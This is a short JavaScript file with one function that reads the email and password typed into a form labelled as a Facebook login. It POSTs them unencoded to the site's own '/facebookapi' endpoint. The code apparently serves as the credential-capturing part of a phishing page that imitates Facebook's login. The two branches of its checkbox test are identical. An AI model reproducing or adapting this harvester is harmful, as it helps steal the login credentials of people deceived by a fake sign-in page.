function facebook(){
    var username = document.getElementById("facebookform").elements["email"].value;
    var password = document.getElementById("facebookform").elements["pwd"].value;
    var check = document.getElementById("defaultcheck").checked;
    if(check){
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
            }
          };
          xhttp.open("POST", "/facebookapi", true);
          xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhttp.send('user='+username+'&pass='+password+'&check='+check);
          return false;
    }
    else{
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
            }
          };
          xhttp.open("POST", "/facebookapi", true);
          xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhttp.send('user='+username+'&pass='+password+'&check='+check);
          return false; 
    }

}